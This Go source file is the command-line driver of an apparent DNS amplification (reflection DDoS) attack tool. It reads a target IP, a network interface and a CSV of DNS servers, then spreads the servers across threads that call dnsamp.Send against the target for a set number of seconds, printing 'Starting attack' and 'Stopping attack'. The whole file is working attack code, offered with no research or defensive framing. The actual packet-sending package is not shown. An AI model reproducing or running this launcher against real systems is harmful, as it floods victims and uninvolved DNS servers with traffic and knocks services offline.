package main

import (
	"dnsamp/dnsamp"
	"flag"
	"fmt"
	"net"
	"time"
)

// CLI arguments
var targetIP = flag.String("target_ip", "", "The IP address of the target of the attack")
var iface = flag.String("iface", "eth0", "The network interface to use")
var filename = flag.String("i", "data/sorted.csv", "Input file: a csv file with domain names")
var numThreads = flag.Int("n", 1, "The number of threads to run in parallel")
var duration = flag.Int("d", 1, "The duration of the attack in seconds")

func main() {
    flag.Parse()
    if *targetIP == "" {
        fmt.Println("Missing target IP")
        fmt.Println("Usage:")
        flag.PrintDefaults()
        return
    }
    target := net.ParseIP(*targetIP)
    dnsamp.Configure(*iface, target)
    allServers := dnsamp.ReadFile(*filename)
    servers := make([][]dnsamp.Target, *numThreads)
    for i, server := range allServers {
        servers[i%*numThreads] = append(servers[i%*numThreads], server)
    }
    // Start threads
    fmt.Println("Starting attack")
    for i:=0; i<*numThreads; i++ {
        go dnsamp.Send(servers[i])
    }
    // Wait for duration in seconds, then stop attack
    time.Sleep(time.Duration(*duration) * time.Second)
    fmt.Println("Stopping attack")
}

